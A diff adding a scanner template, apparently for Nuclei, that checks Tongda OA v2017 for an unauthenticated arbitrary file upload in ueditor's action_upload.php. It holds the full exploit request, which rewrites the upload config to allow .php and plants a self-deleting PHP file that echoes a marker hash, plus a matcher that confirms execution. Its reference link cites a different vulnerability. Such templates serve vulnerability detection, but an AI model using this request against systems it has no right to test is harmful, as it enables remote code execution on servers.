@@ -1,0 +1,61 @@
+id: tongda-oa-v2017-action-upload-arbitrary-file-upload
+
+info:
+  name: tongda-oa-v2017-action-upload-arbitrary-file-upload
+  author: SleepingBag945
+  severity: critical
+  description: 通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v2017%20video_file.php%20任意文件下载漏洞.html
+  tags: tongda,oa,info
+
+http:
+  - raw:
+      - |
+        POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjhddzlqp
+        X_requested_with: XMLHttpRequest
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+        ffff
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+        1000000000
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+        {{randstr_1}}
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+        .php
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="ffff"; filename="test.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5(40167);unlink(__FILE__);?>
+        ------WebKitFormBoundaryjhddzlqp
+        Content-Disposition: form-data; name="mufile"
+
+        submit
+        ------WebKitFormBoundaryjhddzlqp--
+
+  - raw:
+      - |
+        GET {{randstr_1}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "1f18933ca1e531c1eac9cccc4952a03b"
+      - type: status
+        status:
+          - 200
